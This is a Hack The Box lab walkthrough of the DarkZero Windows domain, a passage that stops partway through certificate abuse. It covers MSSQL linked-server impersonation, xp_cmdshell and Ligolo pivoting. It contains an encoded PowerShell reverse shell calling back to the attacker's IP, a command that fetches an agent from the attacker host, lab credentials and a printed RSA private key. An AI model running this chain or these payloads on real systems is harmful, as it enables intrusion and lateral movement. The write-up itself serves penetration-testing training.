---
categories:
- Hackthebox
image:
  path: dark.png
layout: post
media_subpath: /assets/images/darkzero
tags:
- hackthebox
- writeup
- windows
- active-directory
- mssql
- database-links
- logon-types
- adcs
- unconstrained-delegation
- rubeus
- ligolo
- pivoting
- medium
title: HTB - DarkZero Walkthrough
---

## Introduction
DarkZero is a Hard-difficulty Windows domain controller that simulates a real-world penetration testing engagement. The attack path begins with provided credentials for a low-privileged domain user and progresses through SQL Server linked database exploitation, lateral movement via certificate abuse, and ultimately domain compromise through unconstrained delegation. This walkthrough covers key concepts including **database links**, **Windows logon types**, **AD CS ESC1 vulnerabilities**, and **Kerberos delegation attacks**.
**Initial Credentials:** `john.w:RFulUtONCOL!`

## Reconnaissance

### Port Scanning
Initial `nmap` scan reveals a domain controller with standard AD ports and Microsoft SQL Server.

```
nmap -sCV -oA nmap/Darkzero 10.129.2.3
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 19:58 +0300
Nmap scan report for 10.129.2.3
Host is up (0.27s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 16:59:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-02-12T17:01:12+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.2.3:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.2.3:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-12T16:58:06
|_Not valid after:  2056-02-12T16:58:06
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-12T17:00:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit
```

**Key Findings:**
- Domain: `darkzero.htb`
- Domain Controller: `DC01.darkzero.htb`
- Additional Service: MSSQL on port 1433
- WinRM enabled on port 5985
Added domain to hosts file:

```
echo '10.129.2.3  DC01.darkzero.htb darkzero.htb DC01' | sudo tee -a /etc/hosts_
```

### DNS Enumeration

DNS reveals additional network segments requiring pivoting:

```
dig @DC01.darkzero.htb ANY darkzero.htb

; <<>> DiG 9.20.15-2-Debian <<>> @DC01.darkzero.htb ANY darkzero.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28691
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkzero.htb.                  IN      ANY

;; ANSWER SECTION:
darkzero.htb.           600     IN      A       10.129.2.3
darkzero.htb.           600     IN      A       10.129.244.97
darkzero.htb.           600     IN      A       172.16.20.1
darkzero.htb.           3600    IN      NS      dc01.darkzero.htb.
darkzero.htb.           3600    IN      SOA     dc01.darkzero.htb. hostmaster.darkzero.htb. 552 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.darkzero.htb.      3600    IN      A       10.129.2.3
dc01.darkzero.htb.      3600    IN      A       172.16.20.1

;; Query time: 232 msec
;; SERVER: 10.129.2.3#53(DC01.darkzero.htb) (TCP)
;; WHEN: Thu Feb 12 20:03:56 EAT 2026
;; MSG SIZE  rcvd: 187
```

**Network Topology Discovered:**
- `10.129.2.3` - Primary DC (DC01)
- `10.129.244.97` - Unknown host
- `172.16.20.0/24` - Internal network segment
- `172.16.20.1` - DC01 internal interface
- **Implication**: Pivoting will be required to access internal resources
### Initial Domain Enumeration
RPC enumeration reveals a minimal domain with only one non-default user:
I connect successfully to rpc via `rpcclient` but one odd thing is that their is only one user apart from the default users in the domain

```
rpcclient -U john.w darkzero.htb  
Password for [WORKGROUP\john.w]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.w] rid:[0xa2b]
rpcclient $> 
```

SMB shares are limited to defaults with no non-administrative write access:

```
nxc smb darkzero.htb -u john.w -p 'RFulUtONCOL!' --shares
SMB         10.129.2.3    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.2.3    445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.2.3    445    DC01             [*] Enumerated shares
SMB         10.129.2.3    445    DC01             Share           Permissions     Remark
SMB         10.129.2.3    445    DC01             -----           -----------     ------
SMB         10.129.2.3    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.2.3    445    DC01             C$                              Default share
SMB         10.129.2.3    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.2.3    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.2.3    445    DC01             SYSVOL          READ            Logon server share 
```

## Initial Access - MSSQL Enumeration
### Direct Database Access
Authenticating to MSSQL with the provided credentials:

```
impacket-mssqlclient DC01.darkzero.htb/john.w:'RFulUtONCOL!'@10.129.2.3 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
```

Database enumeration shows only default databases:

```
SQL (darkzero\john.w  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
SQL (darkzero\john.w  guest@master)> 
```

Attempts to enable `xp_cmdshell` fail due to insufficient privileges:

```
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (darkzero\john.w  guest@master)> 
```
### Database Link Discovery
**Technical Concept: SQL Server Linked Servers**
Database links are connections that allow a SQL Server instance to execute queries against remote SQL Server instances. Key characteristics:
- **Purpose**: Enable distributed queries across multiple servers
- **Authentication**: Can use current security context or predefined credentials
- **Delegation**: May impersonate the calling user on the remote server
- **Lateral Movement**: Often overlooked but critical pivot points

Enumerating linked servers reveals two connections:

```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
SQL (darkzero\john.w  guest@master)> 
```

**Critical Finding**: When `john.w` queries through the link to `DC02.darkzero.ext`, his connection is **impersonated** as `dc01_sql_svc` on the remote server. This is a privilege escalation across trust boundaries.

## Lateral Movement to SQL Service Account

### Cross-Server Command Execution
Switching context to the linked server:

```
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
```

Unlike our local session, this impersonated context has sufficient privileges to enable `xp_cmdshell`:
```
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> RECONFIGURE
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql   
NULL                   
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)>
```

**Verification**: Successfully executing commands as `svc_sql` on `DC02.darkzero.ext`.
### Reverse Shell via xp_cmdshell
Starting a Penelope listener for multi-session management:

```
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.100.153 • 10.10.14.76
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)

(Penelope)> listeners stop 1
[!] Stopping TCPListener(0.0.0.0:4444)
(Penelope)> listeners add -i tun0  -p 9001
[+] Listening for reverse shells on 10.10.14.76:9001 
(Penelope)> 
```

Executing PowerShell reverse shell through the database link:

```
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
```

Successful callback establishes initial foothold on DC02:

```
(Penelope)> sessions

➤  DC02~10.129.2.3-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC

    ID  | Shell | User                 | Source                       
    <1> | Raw   | darkzero-ext\svc_sql | TCPListener(10.10.14.76:9001)

(Penelope)> use 1
(Penelope)─(Session [1])> interact
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/d4rkc0de/.penelope/sessions/DC02~10.129.2.3-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_02_12-20_24_27-889.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
PS C:\Windows\system32>
```
### Network Discovery

The new host reveals an internal network interface:

```
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.20.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1
PS C:\Windows\system32> 
```
## Information Gathering - Policy Analysis

### Critical Artifact Discovery

In the root directory of C:, an interesting file is discovered:

```
PS C:\Windows\system32> cd /
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          5/8/2021   8:15 AM                PerfLogs                                                             
d-r---         7/29/2025   2:49 PM                Program Files                                                        
d-----         7/29/2025   2:48 PM                Program Files (x86)                                                  
d-r---         7/29/2025   3:23 PM                Users                                                                
d-----         7/30/2025  10:57 PM                Windows                                                              
-a----         7/30/2025   1:38 PM          18594 Policy_Backup.inf                                                    


PS C:\> 
```

This file contains Windows security policy configuration - a goldmine of information.

### Understanding Logon Types and Token Privileges

**Technical Concept: Windows Logon Types**

Windows distinguishes between different logon methods, each producing tokens with different privilege sets:

|Logon Type|Name|Description|Token Characteristics|
|---|---|---|---|
|Type 2|Interactive|Console/RDP logon|Full, unprivileged token|
|Type 3|Network|Net use, UNC, IIS|**RESTRICTED** - most privileges removed|
|Type 4|Batch|Scheduled tasks|Limited, service-like|
|Type 5|Service|Service startup|**FULL** - all assigned privileges|
|Type 8|NetworkCleartext|IIS basic auth|Restricted, like Type 3|

**Critical Finding from Policy File - Service Logon Rights:**

```
[Privilege Rights]
SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,...
```

`svc_sql` is explicitly granted **SeServiceLogonRight** - the right to log on as a service.

**Why This Matters:**
- Service logons (Type 5) receive **full, unprivileged tokens** with all assigned privileges
- Network logons (Type 3) receive **restricted tokens** with most privileges removed
- `xp_cmdshell` always creates **Network Logon (Type 3)** sessions
- Therefore: Our current shell lacks the privileges the account actually possesses
Verifying our current token:

```
PS C:\> whoami /all

USER INFORMATION
----------------

User Name            SID                                         
==================== ============================================
darkzero-ext\svc_sql S-1-5-21-1969715525-31638512-2552845157-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\> 
```

**No SeImpersonatePrivilege** - confirming our restricted token state.
## Pivoting to Internal Network
### Ligolo-ng Tunnel Setup
To access the `172.16.20.0/24` internal network, we establish a pivoting tunnel using Ligolo-ng.
**On Attack Host - Proxy Setup:**

```
# Create tunnel interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start Ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

**On Compromised Host - Agent Deployment:**

```
PS C:\.temp> curl http://10.10.14.76:8000/agent.exe -o agent.exe
PS C:\.temp> .\agent -connect 10.10.14.76:11601 -ignore-cert
```

**On Attack Host - Route Configuration:**

```
ligolo-ng » session
ligolo-ng » start
ligolo-ng » 

# Add route to internal network
sudo ip route add 172.16.20.0/24 dev ligolo
```

Add DNS resolution for the internal domain:

```
echo '172.16.20.2     darkzero.ext' | sudo tee -a /etc/hosts
```
## Privilege Escalation via AD CS
### AD CS Discovery

BloodHound enumeration reveals Active Directory Certificate Services on DC02:

```
PS C:\.temp> .\SharpHound.exe -c all
```

![dark](Pasted image 20260212222323.png)

**Key Finding**: AD CS is enabled with certificate templates vulnerable to ESC1.

### Technical Concept: AD CS ESC1 Vulnerability

**ESC1 - Enrollee Supplies Subject**: This vulnerability occurs when:
1. A certificate template allows **Client Authentication** (smartcard logon)
2. The enrollee can specify a **Subject Alternative Name (SAN)**
3. Low-privileged users/computers have enrollment rights
**Impact**: Any authorized enrollee can request a certificate impersonating **any user** (including Domain Admin), then use that certificate for Kerberos authentication.

### Certificate Request with Certify
Using Certify.exe to request a certificate with our current context:

```
PS C:\.temp> .\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : darkzero-ext\svc_sql
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=svc_sql, CN=Users, DC=darkzero, DC=ext

[*] Certificate Authority   : DC02\darkzero-ext-DC02-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 3

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuYGc00TZhopr31eGb5L6Mri0hn0C9tlaNgDn80JBT86U2O/M
1mn3OA5I0tR3LuWuZd7UdNhOsoWkF6jUA4UeAZN126ASwOLgCV8qxmIFyRNQHhRy
QV4RNeCpQwp5T8g7Go2sES+4lWqi69V11WSmQR41BFrBl/VkV0hbLfYPc6fMlGI+
JrdD9H1i9Wssd7D54C4CVkar9TIbzL7YuC8noUnhduRbEFdox+294KAXrwTREsiI
AWCzvNoxHntSV76djk2uOBP8h/AMMsPCxMErfDnOMXqbl2mUk33R0gbmETJPj0Ix
WVnmaW6JZQuUrBqzu/1BGUKNGf5i1ivy1D9N1QIDAQABAoIBACUMlua3DH7LbIn5
sBbekuvIaf2mQA5PEK5SdgDmjabDyoSdOBrmpQJkD/VTi84o/zDHVUVU4jrTaBd1
l4pwbrK/4b0Qdk5hwX79q8xdTWyAV/L6AGu/vs405XlHQT1G7075VpFEJ6hn2Mwj
INqStIWy48HP4nRYBUdNYzCFwUZGuNHBOKurIqoubtnHsVcym5+fTFi7gkzeT9hZ
cEf8yLnjgiMu+F5RymjXxlL3DCDym7rpb4Jjkzeb/gGkCYEB39pXviixNbpCl3Mt
7EwYsXKcVVqexbE/9sJdtAekn8kz3yBaG42AV7c69jI2bfVaV8cc5GaR+3qXO0qu
nS71940CgYEAyjivgU2j1ILTaH3pbLy/UBDx6v18c8lxRq1WpcsszLqvA2rHl6tx
3p7FVJBevv565my9o9FKUWSIyiYBEAN1Td0Vo5TW5Jg21Icks+bvtpzS6E3S/dM9
qQdjB2YU/EsOK8UT/CvNXn69sNdBhyIHbFF36emD7s8z/HD+5nhj+aMCgYEA6tb0
WQsmNHMcANa030y2vMHRtrBHCmCWjYameul3xRH7HSETrWeht2gS2tDnOC8CMAMZ
JCWzRRT+bGU9tBR/vr2bd3jAJWwq24QCHLGizJEOJIQmCSQ6yMkZKNzIwP+DPvO3
zZCsSh7cAMM16gaKA/hEYIbAocMoonr3Q+m7AicCgYEAlPLL0uHtGkqCjSSxGnas
M71Hc17inCZ0WSqz98p/ZQzcfBfai8ysQt2PW4o7P1MSE0dlJ5SwuOLkHoF/ptvl
O0Ts+2BWKGo1eLVSQ3CGgGtirdkk3/EIKchXGMwICQz/kx3GaqeYzVFtRyRGD9Lw
xMf9Gz30/6F/GSHhnsBuYyECgYEAjW/fBI4JeYdmcz7c+qwqVu7ozn3Gm4JmymAx
fk+EmgVlVzrnrgV/SYX97RnqWFU/nQkQqEuod8/YGBK1ofLCqW9q5f6swx0thr4v
w3ZdFZW7jdSlT9YpLWqoo4qtwkdhlZWVutIKYi3J1Q+9NfCwSQnKrNQbypFOtOUY
bSelQPsCgYAx7v0zrg6PwuWH7Nnt0dfRCe/NWUtA3A7KEcNREHoNrj7mYMkGvn2R
6eHNePEI/hif5M+SNphqKhQW90CymHEYnlt9yZ8dDLpdzff+lNNnP9Ja0SgTiqtg
OW2x923408m5GRU3MB8n9bNrJAVdQK7+VnNYg/MZXrV0wn2YhzCwlA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIHKTCCBRGgAwIBAgITaQAAAAP6hTlukB4HFgAAAAAAAzANBgkqhkiG9w0BAQsF
ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMB4XDTI2MDIxMjIxMTE1
NFoXDTI3MDIxMjIxMTE1NFowUTETMBEGCgmSJomT8ixkARkWA2V4dDEYMBYGCgmS
JomT8ixkARkWCGRhcmt6ZXJvMQ4wDAYDVQQDEwVVc2VyczEQMA4GA1UEAwwHc3Zj
X3NxbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALmBnNNE2YaKa99X
hm+S+jK4tIZ9AvbZWjYA5/NCQU/OlNjvzNZp9zgOSNLUdy7lrmXe1HTYTrKFpBeo
1AOFHgGTddugEsDi4AlfKsZiBckTUB4UckFeETXgqUMKeU/IOxqNrBEvuJVqouvV
ddVkpkEeNQRawZf1ZFdIWy32D3OnzJRiPia3Q/R9YvVrLHew+eAuAlZGq/UyG8y+
2LgvJ6FJ4XbkWxBXaMftveCgF68E0RLIiAFgs7zaMR57Ule+nY5NrjgT/IfwDDLD
wsTBK3w5zjF6m5dplJN90dIG5hEyT49CMVlZ5mluiWULlKwas7v9QRlCjRn+YtYr
8tQ/TdUCAwEAAaOCAvswggL3MBcGCSsGAQQBgjcUAgQKHggAVQBzAGUAcjApBgNV
HSUEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/
BAQDAgWgMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUZeDhcpAPEAQh
thkGi4H0wNxEFOQwHwYDVR0jBBgwFoAU1Rl+LJBmS8zfG6d+AhLydWFBqowwgdAG
A1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049ZGFya3plcm8tZXh0LURD
MDItQ0EsQ049REMwMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/
Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERp
c3RyaWJ1dGlvblBvaW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKG
gadsZGFwOi8vL0NOPWRhcmt6ZXJvLWV4dC1EQzAyLUNBLENOPUFJQSxDTj1QdWJs
aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
LERDPWRhcmt6ZXJvLERDPWV4dD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAvBgNVHREEKDAmoCQGCisGAQQBgjcU
AgOgFgwUc3ZjX3NxbEBkYXJremVyby5leHQwTQYJKwYBBAGCNxkCBEAwPqA8Bgor
BgEEAYI3GQIBoC4ELFMtMS01LTIxLTE5Njk3MTU1MjUtMzE2Mzg1MTItMjU1Mjg0
NTE1Ny0xMTAzMA0GCSqGSIb3DQEBCwUAA4ICAQCVA3nAr9LtQhs9RH+ANzlXYhs/
20qIIVRX5kJFsxhlTDIiI0j5CwsMGrwBfsbBfyHbpNHescS1z/obxj/RH+D9jgAY
Zo3zgOypBcPTIdsb6UCGCACfiepWYbIrqLPwQJyK8V4dmXQf4NJqYak2Tkq/J5Bw
Y46RZXyLOWlM3e3KIaTCjwPvVrxPgf8TPhyD2FbCt/Ng9TnTuUBy7IbpWWLiy0Ja
Nxvy4/89mo27/3w0nCgRlwDtCfeVvcR8CBAyyWFQZGeQ9HxUTqq5q4rsEhsFk8+8
FUxKV9VCnqiX2o7RShOvGp2Wd4cJZA8iNdP3k0zajSkQx2vaU/YBffiOFTlxYMaO
gBg+76ecxpB7mYzd/BIZA0MrQdM3/Jfgt3YoYIv5Qc91W5MbE4mLghWpihfUfC/O
hR/UA+WRlUQEidCDLqQjprrBJA/UpeWewRnY+jgkSXkwiIqjcXVIMA3b6mThovw8
GW+G4hWmc2tlcM7U9a6l828N9igyH8UYmRQhaqxl8SZRWGNtf8DCaxIXX4tLWeaD
4btddOlR1h+Z2FD4VYuiy/rQw006C+LHc3XJrcN4KruUIoetqv3ifY0PLe/HHqJy
5qpTGWTdTmpfzaK0WMDx1fU3RjnMjss2g9DSrHAq4Tbo7MdX13K/absutVanSxcN
bKnpuCRZvq0oFPiIcg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:11.7801632
PS C:\.temp> 
```

**Success**: Certificate issued with UPN `svc_sql@darkzero.ext`

```
# Convert to PFX for Certipy
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
# Extract NTLM hash via Certipy
